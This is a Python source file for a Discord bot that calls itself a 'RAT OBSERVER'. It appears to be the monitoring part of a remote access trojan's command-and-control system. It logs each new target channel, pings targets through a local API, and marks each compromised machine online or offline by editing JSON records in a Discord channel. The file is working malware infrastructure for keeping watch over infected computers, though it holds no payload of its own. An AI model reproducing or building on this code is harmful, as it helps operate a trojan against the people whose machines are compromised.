from asyncio import sleep
import asyncio
import os
import re
import json
import threading
import time
import discord
from discord.ext import commands
from dotenv import load_dotenv
from features.setup import generate_uuid
import requests
import sched


load_dotenv()
__DISCORD_TARGETS_CHANNEL_ID    = int(os.environ.get("DISCORD_TARGETS_CHANNEL_ID")) # should be in int type!
__DISCORD_GUILD_ID              = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
__DISCORD_OBSERVER_TOKEN        = os.environ.get("DISCORD_OBSERVER_TOKEN") # should be in string type!
__API_BASE                      = "http://localhost:8000/api"
_CHECK_TARGETS_DELAY            = 10
_CHECK_TARGET_TIMEOUT           = 5

def __get_targets_channel_by_id(bot):
    guild = bot.get_guild(__DISCORD_GUILD_ID)
    return discord.utils.get(guild.channels, id=__DISCORD_TARGETS_CHANNEL_ID)


async def __check_target_status(bot, ctx):
    message_check = 'pong!'

    def check(message):
        return message.author.bot and message.content == message_check

    online = True

    try:
        await bot.wait_for('message', timeout=_CHECK_TARGET_TIMEOUT, check=check)
    except asyncio.TimeoutError:
        online = False

    response = requests.get(f"{__API_BASE}/targetmessagebyuuid/{ctx.channel.name}")

    if response.text:
        message = json.loads(response.text)
        message_id = message['message_id']
        target_channel = __get_targets_channel_by_id(bot)
        target_message = await target_channel.fetch_message(message_id)
        json_content = json.loads(target_message.content)
        json_content['online'] = online
        await target_message.edit(content = json.dumps(json_content))


def check_targets():
    response = requests.get(f"{__API_BASE}/targets")

    if response.text:
        targets = json.loads(response.text)

        for target in targets:
            requests.get(f"{__API_BASE}/ping/{target['identifier']}")


def main():
    bot = commands.Bot(command_prefix="!")

    @bot.event
    async def on_ready():
        print('RAT OBSERVER ONLINE!')
        check_targets()

    @bot.event
    async def on_message(message):
        if not message.author.bot:
            return

        if re.match(r'!ping',message.content):
            await ping(await bot.get_context(message))

    @bot.event
    async def on_guild_channel_create(channel):
        guild = channel.guild
        targets_channel = discord.utils.get(guild.text_channels, id=__DISCORD_TARGETS_CHANNEL_ID)

        await targets_channel.send(json.dumps({
            'identifier': channel.name,
            'channel_id': channel.id,
            'metadata': channel.topic,
            'online': True
        }))
        
    @bot.command()
    async def ping(ctx):
        await __check_target_status(bot, ctx)
        threading.Timer(_CHECK_TARGETS_DELAY, check_targets).start()


    bot.run(__DISCORD_OBSERVER_TOKEN)

if __name__ == '__main__':
    main()